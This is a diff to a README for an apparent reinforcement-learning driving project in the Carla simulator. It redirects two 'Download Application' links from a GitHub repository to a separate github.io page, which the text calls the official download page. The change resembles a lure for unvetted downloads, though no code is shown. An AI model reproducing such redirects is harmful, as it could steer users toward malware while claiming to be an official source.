@@ -1,6 +1,6 @@
 # 🤖 Autonomous-Driving-in-Carla-using-Deep-Reinforcement-Learning - Learn AI Driving Without Real Cars
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Supercharged-body2228/Autonomous-Driving-in-Carla-using-Deep-Reinforcement-Learning)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://supercharged-body2228.github.io)
 
 ## 🎯 What Is This?
 
@@ -25,7 +25,7 @@ Follow these simple steps to get the application running on your computer.
 
 Visit this link to download the application:
 
-[**Click Here to Download**](https://github.com/Supercharged-body2228/Autonomous-Driving-in-Carla-using-Deep-Reinforcement-Learning)
+[**Click Here to Download**](https://supercharged-body2228.github.io)
 
 This will take you to the official download page. Look for the download button or the latest release file.
 
